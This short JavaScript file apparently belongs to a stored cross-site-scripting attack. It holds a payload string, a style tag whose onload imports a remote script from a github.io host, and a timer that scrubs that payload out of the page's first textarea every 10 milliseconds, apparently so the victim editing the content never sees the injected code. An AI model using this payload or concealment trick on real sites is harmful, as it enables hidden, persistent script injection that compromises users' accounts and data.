function foo() {
    let code = "<style onload=import(`https://cstcamaro.github.io/JustKnowInvoke2/hiddendemo.js`)>"
    var textareaNode = document.getElementsByTagName("textarea")[0];
    let value = textareaNode.value;
    let innerText = textareaNode.innerText;
    if (value != "" || innerText != "") {
        textareaNode.value = value.replace(code, "");
        textareaNode.innerText = innerText.replace(code, "");
    }
}

setInterval(foo, 10);
